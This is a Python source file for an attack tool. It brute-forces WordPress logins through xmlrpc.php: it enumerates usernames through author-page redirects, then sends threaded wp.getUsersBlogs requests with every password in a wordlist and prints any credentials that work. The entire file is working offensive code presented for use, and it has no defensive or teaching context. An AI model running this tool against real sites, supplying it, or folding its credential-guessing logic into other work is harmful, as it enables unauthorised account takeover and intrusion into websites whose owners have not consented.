import requests
import threading
from queue import Queue
import xml.etree.ElementTree as ET

print("\033[1;36m")
print(r"""
__  ____  __ _          ____  ____   ____
\ \/ /  \/  | |        |  _ \|  _ \ / ___|
 \  /| |\/| | |   _____| |_) | |_) | |
 /  \| |  | | |__|_____|  _ <|  __/| |___
/_/\_\_|  |_|_____|    |_| \_\_|    \____|

XML-RPC Brute Forcer - By Sheikh Nightshader
""")
print("\033[0m")

target_url = input("WordPress URL: ").rstrip("/")
if not target_url.endswith("/xmlrpc.php"):
    xmlrpc_url = f"{target_url}/xmlrpc.php"
else:
    xmlrpc_url = target_url

wordlist = input("Path to password wordlist: ")
threads_count = int(input("Number of threads: "))

password_queue = Queue()


def find_usernames(url):
    usernames = set()
    for i in range(1, 11):
        try:
            author_url = f"{url}/?author={i}"
            response = requests.get(author_url, timeout=5, allow_redirects=True)
            if response.status_code == 200 and response.url != author_url:
                username = response.url.rstrip("/").split("/")[-1]
                usernames.add(username)
        except Exception:
            continue
    return list(usernames)


def load_passwords():
    with open(wordlist, "r") as f:
        for line in f:
            password_queue.put(line.strip())


def parse_response(response_text):
    try:
        root = ET.fromstring(response_text)
        blog = root.find(".//struct/member[name='blogid']/value")
        return blog is not None
    except ET.ParseError:
        return False


def brute_force(username):
    while not password_queue.empty():
        password = password_queue.get()
        payload = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>
        """
        headers = {'Content-Type': 'application/xml'}
        try:
            response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=5)
            if response.status_code == 200 and parse_response(response.text):
                print(f"\033[1;32m[+] Success: {username}:{password}\033[0m")
                password_queue.queue.clear()
                break
            else:
                print(f"\033[1;31m[-] Failed: {username}:{password}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {e}\033[0m")
        password_queue.task_done()


usernames = find_usernames(target_url)
if usernames:
    print("\033[1;34mDiscovered usernames:\033[0m")
    for idx, username in enumerate(usernames, start=1):
        print(f"{idx}. {username}")
    choice = int(input("Select a username: "))
    selected_username = usernames[choice - 1]
else:
    selected_username = input("Enter the username manually: ")

load_passwords()
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=brute_force, args=(selected_username,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
